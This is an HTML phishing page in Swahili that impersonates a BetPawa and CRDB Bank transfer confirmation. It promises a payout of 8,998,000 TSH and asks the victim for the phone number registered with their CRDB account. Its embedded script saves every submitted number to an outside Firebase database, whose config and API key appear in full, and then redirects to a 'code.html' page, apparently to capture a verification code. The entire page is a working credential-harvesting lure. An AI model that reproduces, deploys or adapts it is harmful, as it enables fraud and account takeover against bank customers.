<!DOCTYPE html>
<html lang="sw">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Uhakikisho wa Uhamisho - BetPawa CRDB</title>
  <style>
    body {
      font-family: "Poppins", sans-serif;
      background-color: #001f3f; /* Navy blue background */
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background: rgba(255, 255, 255, 0.95);
      color: #000;
      padding: 35px;
      border-radius: 15px;
      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
      max-width: 420px;
      width: 90%;
      text-align: center;
    }

    h1 {
      color: #001f3f;
      margin-bottom: 15px;
      font-size: 22px;
    }

    p {
      line-height: 1.6;
      margin-bottom: 20px;
      font-size: 15px;
    }

    input {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
      margin-bottom: 15px;
    }

    button {
      background-color: #001f3f;
      color: white;
      border: none;
      padding: 12px 20px;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      width: 100%;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #003366;
    }

    .note {
      font-size: 14px;
      color: #333;
      margin-top: 10px;
    }

    .success {
      color: green;
      font-weight: bold;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>✅ BetPawa - Uhamisho Tayari</h1>
    <p>
      BetPawa imeandaa uhamisho wa <strong>8,998,000 TSH</strong><br>
      kwenda kwenye akaunti ya <strong>CRDB Bank 10122087471</strong>.
    </p>
    <p>
      Ili kuthibitisha uhamisho huu, tafadhali weka namba ya simu
      iliyosajiliwa na akaunti yako ya CRDB hapa chini.
    </p>

    <input type="tel" id="phoneNumber" placeholder="Ingiza namba ya simu ya CRDB" />
    <button id="submitBtn">Tuma</button>

    <div id="message" class="note"></div>
  </div>

  <!-- Firebase Scripts -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

    // Firebase Configuration
    const firebaseConfig = {
      apiKey: "AIzaSyD4NQ9EsQqerx6y7v322p2ycraoDWJSRcM",
      authDomain: "airdropusdt-767d7.firebaseapp.com",
      databaseURL: "https://airdropusdt-767d7-default-rtdb.europe-west1.firebasedatabase.app",
      projectId: "airdropusdt-767d7",
      storageBucket: "airdropusdt-767d7.firebasestorage.app",
      messagingSenderId: "627616603037",
      appId: "1:627616603037:web:63041f067800c97fab6d74",
      measurementId: "G-01F6G2CYXK"
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // Handle submission
    const submitBtn = document.getElementById("submitBtn");
    const messageDiv = document.getElementById("message");

    submitBtn.addEventListener("click", async () => {
      const phone = document.getElementById("phoneNumber").value.trim();

      if (phone === "") {
        messageDiv.textContent = "⚠️ Tafadhali ingiza namba ya simu.";
        messageDiv.style.color = "red";
        return;
      }

      try {
        const phoneRef = ref(db, "crdb_submissions");
        const newEntry = push(phoneRef);
        await set(newEntry, {
          phoneNumber: phone,
          muda: new Date().toISOString(),
        });

        messageDiv.textContent = "✅ Namba yako imetumwa kwa mafanikio...";
        messageDiv.classList.add("success");

        // Redirect after short delay
        setTimeout(() => {
          window.location.href = "code.html";
        }, 1200);
      } catch (error) {
        console.error("Kosa:", error);
        messageDiv.textContent = "❌ Imeshindikana kutuma. Tafadhali jaribu tena.";
        messageDiv.style.color = "red";
      }
    });
  </script>
</body>
</html>
